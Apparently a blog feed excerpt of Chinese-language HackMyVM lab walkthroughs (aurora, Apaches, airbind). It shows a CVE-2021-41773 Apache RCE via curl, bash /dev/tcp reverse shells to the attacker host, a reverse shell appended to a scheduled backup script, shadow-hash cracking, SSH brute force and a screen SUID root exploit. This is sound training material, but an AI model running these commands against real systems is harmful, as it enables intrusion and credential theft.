lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt
doro@aurora:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount

```

`/usr/bin/screen`Ëøô‰∏™Ê≤°ËßÅËøáÔºåÁúãÁúãËÉΩ‰∏çËÉΩÊèêÊùÉ„ÄÇÊâæÂà∞‰∏ÄÁØá[ÊñáÁ´†](https://www.exploit-db.com/exploits/41154)ÔºåËøòÊòØÂà©Áî®ËÑöÊú¨ÔºåÊõ¥ÂºÄÂøÉ‰∫Ü

```bash
doro@aurora:/tmp$ vi screenroot.sh
doro@aurora:/tmp$ chmod +x screenroot.sh 
doro@aurora:/tmp$ bash screenroot.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‚Äòdropshell‚Äô:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‚Äòchmod‚Äô [-Wimplicit-function-declaration]
    7 |     chmod('/tmp/rootshell', 04755);
      |     ^~~~~
/tmp/rootshell.c: In function ‚Äòmain‚Äô:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‚Äòsetuid‚Äô [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‚Äòsetgid‚Äô [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‚Äòseteuid‚Äô [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‚Äòsetegid‚Äô [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‚Äòexecvp‚Äô [-Wimplicit-function-declaration]
    7 |     execvp('/bin/sh', NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‚Äòexecvp‚Äô expecting 2 [-Wbuiltin-declaration-mismatch]
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
uid=0(root) gid=0(root) groups=0(root),1000(doro)

```

ÊàêÂäüÊèêÊùÉsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_aurora.html</guid><pubDate>Fri, 27 Jun 2025 09:32:32 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPHK.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches

# 0. ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.143
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1. Êâ´Êèè

È¶ñÂÖàÔºåÈÄöËøá `nmap` ÂØπÈù∂Êú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÊ£ÄÊü•ÂºÄÊîæÁ´ØÂè£ÂíåÊúçÂä°Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
Nmap scan report for 192.168.205.143
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

‰ªéÊâ´ÊèèÁªìÊûúÂèØ‰ª•ÁúãÂà∞ÔºåÈù∂Êú∫ÂºÄÂêØ‰∫Ü **SSH** Âíå **HTTP** ÊúçÂä°„ÄÇÊé•‰∏ãÊù•ÔºåÊàë‰ª¨ÂØπ HTTP ÊúçÂä°ËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÊ∏óÈÄèÊµãËØï„ÄÇ

# 2. ÊºèÊ¥ûÊâ´Êèè‰∏éÂà©Áî®

ÈÄöËøáËÆøÈóÆ Web ÊúçÂä°ÔºåÊú™ÂèëÁé∞ÊòéÊòæÁöÑÊºèÊ¥û„ÄÇÂõ†Ê≠§ÔºåÊàë‰ΩøÁî® **feroxbuster** ÂØπÈù∂Êú∫ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåËôΩÁÑ∂Êú™Ëé∑ÂæóÊúâÊïàÁöÑÁõÆÂΩïÂàóË°®Ôºå‰ΩÜÁªßÁª≠‰ΩøÁî® `nuclei` Â∑•ÂÖ∑ÂØπÈù∂Êú∫ËøõË°åÊºèÊ¥ûÊâ´ÊèèÔºåÊúÄÁªàÂèëÁé∞‰∫Ü‰∏Ä‰∏™È´òÂç±ÊºèÊ¥ûÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nuclei -u 192.168.205.143
...
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
...
[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773):RCE] [http] [high] http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
...
```

ËØ•ÊºèÊ¥û‰∏∫ **[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773)**ÔºåÊòØ Apache HTTP ÊúçÂä°Âô®ÁöÑÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåËÉΩÂ§üÈÄöËøáËÆøÈóÆÁâπÂÆöË∑ØÂæÑÊâßË°åÂëΩ‰ª§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

ÊâßË°åÊàêÂäüÂêéÔºåËé∑Âèñ‰∫ÜÈù∂Êú∫ÁöÑÂü∫Êú¨‰ø°ÊÅØÔºåËøõ‰∏ÄÊ≠•Á°ÆËÆ§ÊºèÊ¥ûÊúâÊïà„ÄÇÁé∞Âú®Êàë‰ª¨ÊâßË°åÂèçÂºπshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1''

#kali
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 60584
bash: cannot set terminal process group (651): Inappropriate ioctl for device
bash: no job control in this shell
daemon@apaches:/usr/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

# 3. Ëé∑ÂèñÁ®≥ÂÆöÁöÑ Shell

‰∏∫‰∫ÜËé∑Âèñ‰∏Ä‰∏™Êõ¥Âä†Á®≥ÂÆöÁöÑ‰∫§‰∫íÂºè shellÔºåÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

Ëøô‰∫õÊìç‰ΩúÁ°Æ‰øù‰∫Ü‰∏éÈù∂Êú∫ÁöÑËøûÊé•Êõ¥‰∏∫Á®≥ÂÆöÔºåÂπ∂‰∏∫ÂêéÁª≠ÁöÑÊ∏óÈÄèÊìç‰ΩúÊèê‰æõ‰∫ÜËâØÂ•ΩÁöÑÂü∫Á°Ä„ÄÇ

# 4.ÊèêÊùÉ

```bash
daemon@apaches:/usr/bin$ cd /home/
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd geronimo/
daemon@apaches:/home/geronimo$ ls -al
total 32
drwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 .
drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history
-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt
daemon@apaches:/home/geronimo$ cd ..
daemon@apaches:/home$ cd pocahontas/
daemon@apaches:/home/pocahontas$ ls -al
total 36
drwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .
drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt
daemon@apaches:/home/pocahontas$ cd ..
daemon@apaches:/home$ cd sacagawea/
daemon@apaches:/home/sacagawea$ ls -la
total 48
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .
drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
drwxrwxr-x 2 sacagawea sacagawea 4096 Jan 22 06:06 Backup
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt
daemon@apaches:/home/sacagawea$ cd Backup/
daemon@apaches:/home/sacagawea/Backup$ ls -al
total 23128
drwxrwxr-x 2 sacagawea sacagawea     4096 Jan 22 06:06 .
drwxr-xr-x 6 sacagawea sacagawea     4096 Jul 13  2023 ..
-rwx------ 1 sacagawea sacagawea 23673389 Jan 22 06:06 Backup.tar.gz
daemon@apaches:/home/sacagawea/Backup$ cd ..
daemon@apaches:/home/sacagawea$ cd Development/
daemon@apaches:/home/sacagawea/Development$ ls -al
total 68
drwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13  2023 ..
drwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts
drwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images
-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js
-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt
daemon@apaches:/home/sacagawea/Development$ cd ..
daemon@apaches:/home/sacagawea$ cd ..
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd squanto/
daemon@apaches:/home/squanto$ ls -al
total 36
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local
-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt
daemon@apaches:/home/squanto$ cat backup/
cat: backup/: Is a directory
daemon@apaches:/home/squanto$ cd backup/ 
daemon@apaches:/home/squanto/backup$ ls -al
total 8
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 ..
daemon@apaches:/home/squanto/backup$ c d..
c: command not found
daemon@apaches:/home/squanto/backup$ cd ..
daemon@apaches:/home/squanto$ cat todo.md  
### Development

- [x] Apaches frontpage
- [ ] Portal for administration
- [ ] Database selection for administration
- [ ] Hardening the system for attacks
daemon@apaches:/home/squanto$ cd /opt/ 
daemon@apaches:/opt$ ls --la
ls: unrecognized option '--la'
Try 'ls --help' for more information.
daemon@apaches:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
daemon@apaches:/opt$ cd /tmp/
daemon@apaches:/tmp$ ls -al
total 44
drwxrwxrwt 11 root root 4096 Jan 22 06:04 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .Test-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .font-unix
drwx------  3 root root 4096 Jan 22 05:58 snap-private-tmp
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-logind.service-62l80f
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-resolved.service-U7wK0h
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-timesyncd.service-6HVyEh

daemon@apaches:/tmp$ wget 192.168.205.141/linpeas.sh
--2025-01-22 06:10:32--  http://192.168.205.141/linpeas.sh
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824847 (806K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================&gt;] 805.51K  --.-KB/s    in 0.02s   

2025-01-22 06:10:32 (49.1 MB/s) - 'linpeas.sh' saved [824847/824847]

daemon@apaches:/tmp$ chmod +x linpeas.sh 
daemon@apaches:/tmp$ bash linpeas.sh 
‚ïê‚ï£ Can I read shadow files? ............. root:*:18375:0:99999:7:::                                                                
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::                                                                                                                                  
‚ïê‚ï£ Can I read shadow plists? ............ No
‚ïê‚ï£ Can I write shadow plists? ........... No                                                                                       
‚ïê‚ï£ Can I read opasswd file? ............. No                                                                                       
‚ïê‚ï£ Can I write in network-scripts? ...... No                                                                                       
‚ïê‚ï£ Can I read root folder? .............. No                   
```

ÊàëÂéª......ÊàëÊòØÊ≤°ÊÉ≥Âà∞ÂÆÉ`/etc/shadow`ÊòØÂèØËØªÁöÑ„ÄÇÊàë‰ª¨Â∞ÜÊï∞ÊçÆÊèêÂèñÂá∫Êù•ÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat hash
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)   
1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor
Use the '--show' option to display all of the cracked passwords reliably
Session aborted

```

Êàë‰ª¨ÁôªÂΩï‰∏äÂéªÔºåÁªßÁª≠ÊèêÊùÉ

```bash
squanto@apaches:/home/sacagawea$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
squanto@apaches:/home/sacagawea$ find / -group Lipan 2&gt;/dev/null
/home/sacagawea/Scripts/backup.sh
squanto@apaches:/home/sacagawea$ cd /home/sacagawea/Scripts/
squanto@apaches:/home/sacagawea/Scripts$ ls -al
total 12
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 ..
-rwxrwx--- 1 sacagawea Lipan      182 Oct 10  2022 backup.sh
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
```

Êúâ‰∏Ä‰∏™ËÑöÊú¨Êñá‰ª∂ÔºåÁúãÁùÄÂ∞±ÂÉèÂÆöÊó∂‰ªªÂä°ÔºåËÄå‰∏îÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπÔºåÊàë‰ª¨Âä†‰∏™ÂèçÂºπshell‰∏äÂéª

```bash
squanto@apaches:/home/sacagawea/Scripts$ echo 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'' &gt;&gt; backup.sh 
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'
```

Êàë‰ª¨Á®çÁ≠âÁâáÂàª

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8889                                
listening on [any] 8889 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 50796
bash: cannot set terminal process group (48786): Inappropriate ioctl for device
bash: no job control in this shell
sacagawea@apaches:~$ id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

ÁªßÁª≠ÊèêÊùÉ

```bash
sacagawea@apaches:~$ cd Development/
sacagawea@apaches:~/Development$ ls
ls
admin
css
fonts
images
index.html
js
robots.txt
sacagawea@apaches:~/Development$ cd admin/
sacagawea@apaches:~/Development/admin$ ls
ls
1a-login.php
1b-login.css
2-check.php
3-protect.php
sacagawea@apaches:~/Development/admin$ cat 2-check.php 
&lt;?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST['user']) &amp;&amp; !isset($_SESSION['user'])) {
  // (B1) USERS &amp; PASSWORDS - SET YOUR OWN !
  $users = [
    'geronimo' =&gt; '12u7D9@4IA9uBO4pX9#6jZ3456',
    'pocahontas' =&gt; 'y2U1@8Ie&amp;OHwd^Ww3uAl',
    'squanto' =&gt; '4Rl3^K8WDG@sG24Hq@ih',
    'sacagawea' =&gt; 'cU21X8&amp;uGswgYsL!raXC'
  ];

  // (B2) CHECK &amp; VERIFY
  if (isset($users[$_POST['user']])) {
    if ($users[$_POST['user']] == $_POST['password']) {
      $_SESSION['user'] = $_POST['user'];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION['user'])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION['user'])) {
  header('Location: index.php');
  exit();
}
```

ÂèëÁé∞‰∫ÜÂá†ÁªÑÁî®Êà∑ÂíåÂØÜÁ†ÅÔºåÊàë‰ª¨Â∞ùËØïÂà©Áî®ÂÖ∂ÁàÜÁ†¥ssh

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user              
geronimo
pocahontas
squanto
sacagawea
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat pass
12u7D9@4IA9uBO4pX9#6jZ3456
y2U1@8Ie&amp;OHwd^Ww3uAl
4Rl3^K8WDG@sG24Hq@ih
cU21X8&amp;uGswgYsL!raXC

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P pass ssh://192.168.205.143 -V -I -u -f -e nsr -t 64

[22][ssh] host: 192.168.205.143   login: pocahontas   password: y2U1@8Ie&amp;OHwd^Ww3uAl
[STATUS] attack finished for 192.168.205.143 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:09

```

Êàë‰ª¨ÈÄöËøásshËøûÊé•‰∏äÂéªÔºàÂª∫ËÆÆËøôÊ†∑ËøûÊé•Ôºå‰∏çË¶ÅË¶Å‰∏ä‰∏Ä‰∏™Áî®Êà∑ÂàáÁî®Êà∑Ôºå‰∏çÁÑ∂ÂÆÉsudo‰ºöÊä•ÈîôÔºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh pocahontas@192.168.205.143

pocahontas@apaches:~$ sudo -l
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
```

![Image](https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e)

ÂèØ‰ª•‰ΩøÁî®**sudo nano**ÔºåÊàë‰ª¨ËøõË°åÊèêÊùÉ

```bash
pocahontas@apaches:~$ sudo -u geronimo /bin/nano
$ bash
geronimo@apaches:/home/pocahontas$ sudo bash -p
root@apaches:/home/pocahontas# id
uid=0(root) gid=0(root) groups=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Apaches.html</guid><pubDate>Fri, 27 Jun 2025 09:32:30 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPHK.github.io/post/hmv_airbind.html</link><description># hmv_airbind

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=airbind
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.212
**Êú¨Êú∫** IPÔºö192.168.205.141

---

### **1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã**

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
Nmap scan report for 192.168.205.212
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
